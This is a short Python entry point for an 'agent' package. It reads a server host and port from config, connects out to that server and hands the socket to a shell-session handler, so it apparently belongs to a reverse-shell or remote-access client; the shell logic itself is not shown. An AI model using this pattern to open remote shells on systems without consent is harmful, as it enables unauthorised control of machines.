import sys

from agent.core.config import load_config
from agent.core.connection import connect_and_run
from agent.core.dispatcher import handle_session
from agent.platform import get_platform


def main():
    config = load_config()
    platform = get_platform()

    def shell_callback(sock):
        handle_session(sock, platform)

    try:
        connect_and_run(
            config['server_host'],
            config['server_port'],
            shell_callback
        )
    except KeyboardInterrupt:
        sys.exit()


if __name__ == '__main__':
    main()
